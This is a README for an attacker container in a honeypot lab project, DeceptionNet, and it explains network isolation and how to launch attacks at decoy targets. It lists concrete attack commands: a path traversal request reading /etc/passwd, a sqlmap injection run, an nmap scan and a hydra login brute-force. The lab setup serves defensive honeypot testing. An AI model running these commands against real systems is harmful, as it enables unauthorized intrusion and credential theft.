# DeceptionNet Attacker Container

A throwaway host for **launching attacks** at the DeceptionNet lab targets. It
lives on the **same `honeypot_net`** as the decoys, so it can reach:

- the **attack-target** web app → `http://attack-target:9090`
- the **Cowrie** SSH honeypot → `honeypot:2222`
- **Dionaea** and the **custom-decoy**

It cannot reach `core-api`, `ai-service`, or `dashboard` — those live on the
isolated `deceptionnet` network, so the attacker (and anything it compromises)
never sees the backend. That's the isolation model the project is built on.

> ⚠️ This is an attack tool container. Use it only inside your own DeceptionNet
> lab / sandbox. Do not point it at anything you don't own.

## Included tools
`nmap` · `hydra` · `sqlmap` (pip) · `curl` · `nc` · `ping` · `jq`

## Start it
```bash
docker compose up -d --build attacker
```

## Attack from inside (the fun part)
```bash
# get a shell inside the attacker
docker compose exec attacker bash

# 1) run the whole attack chain against the web app
/opt/attack/scripts/full-attack.sh

# 2) brute-force the Cowrie SSH honeypot
/opt/attack/scripts/ssh-bruteforce.sh

# 3) ad-hoc commands
curl -s "http://attack-target:9090/read?file=../../../../etc/passwd"
sqlmap -u "http://attack-target:9090/login" --data "username=a&password=b" --level 3
nmap -sV -p 9090 attack-target
hydra -l admin -P /root/rockyou.txt http-post-form \
  "http://attack-target:9090/login:username=^USER^&password=^PASS^:Invalid" 
```

While you attack, keep the **dashboard** (http://localhost:3000) open — every
attempt lands there as a live session with its MITRE ATT&CK mapping and AI
summary, tagged `honeypot: attack-target`.

## Files
- `Dockerfile` — Debian-slim + attack tools
- `scripts/full-attack.sh` — one-shot web attack chain
- `scripts/ssh-bruteforce.sh` — one-shot Cowrie brute force
- `scripts/mini-pass.txt` / `mini-users.txt` — small wordlists for hydra
